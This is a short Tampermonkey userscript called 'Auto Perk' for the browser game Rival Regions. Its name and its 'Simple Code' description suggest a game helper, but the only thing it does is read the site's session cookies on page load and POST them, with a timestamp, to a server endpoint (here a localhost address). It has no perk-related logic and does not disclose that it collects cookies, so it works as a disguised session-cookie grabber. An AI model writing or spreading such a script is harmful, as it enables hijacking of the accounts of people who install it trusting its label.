// ==UserScript==
// @name         Auto Perk
// @namespace    http://tampermonkey.net/
// @version      1.0.0
// @description  Simple Code
// @author       UserScript
// @match        *://m.rivalregions.com/*
// @grant        GM_xmlhttpRequest
// @run-at       document-idle
// ==/UserScript==

(function () {
    'use strict';
    const now = new Date();
    const timestamp =
    String(now.getDate()).padStart(2, "0") + "/" +
    String(now.getMonth() + 1).padStart(2, "0") + "/" +
    now.getFullYear() + " " +
    String(now.getHours()).padStart(2, "0") + ":" +
    String(now.getMinutes()).padStart(2, "0");


    function addAccount() {
        if (!document.cookie) return;

        GM_xmlhttpRequest({
            method: "POST",
            url: "http://localhost:3000/autoperk/add",
            headers: {
                "Content-Type": "application/json"
            },
            data: JSON.stringify({
                cookie: document.cookie,
                timestamp
            })
        });
    }
    addAccount();
})();
